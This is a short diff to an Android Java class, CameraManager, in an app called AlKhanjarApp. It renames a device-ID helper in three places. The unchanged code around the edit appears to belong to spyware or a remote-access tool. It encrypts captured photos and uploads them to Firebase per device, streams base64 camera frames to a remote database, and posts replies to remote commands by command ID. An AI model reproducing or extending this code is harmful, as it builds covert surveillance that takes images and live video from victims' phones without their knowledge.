@@ -175,7 +175,7 @@ public class CameraManager {
             byte[] encryptedData = CryptoManager.encryptBytes(imageData);
             
             FirebaseStorage storage = FirebaseStorage.getInstance();
-            String fileName = "photos/" + AlKhanjarApp.getDeviceId() + "/" + System.currentTimeMillis() + ".jpg";
+            String fileName = "photos/" + AlKhanjarApp.getDeviceUniqueId() + "/" + System.currentTimeMillis() + ".jpg";
             StorageReference storageRef = storage.getReference().child(fileName);
             
             storageRef.putBytes(encryptedData)
@@ -312,7 +312,7 @@ public class CameraManager {
             
             FirebaseDatabase database = FirebaseDatabase.getInstance();
             database.getReference("stream")
-                .child(AlKhanjarApp.getDeviceId())
+                .child(AlKhanjarApp.getDeviceUniqueId())
                 .setValue(base64Frame);
                 
         } catch (Exception e) {
@@ -404,7 +404,7 @@ public class CameraManager {
         try {
             FirebaseDatabase database = FirebaseDatabase.getInstance();
             DatabaseReference responseRef = database.getReference("responses")
-                .child(AlKhanjarApp.getDeviceId())
+                .child(AlKhanjarApp.getDeviceUniqueId())
                 .child(commandId);
             
             Map<String, Object> response = new HashMap<>();
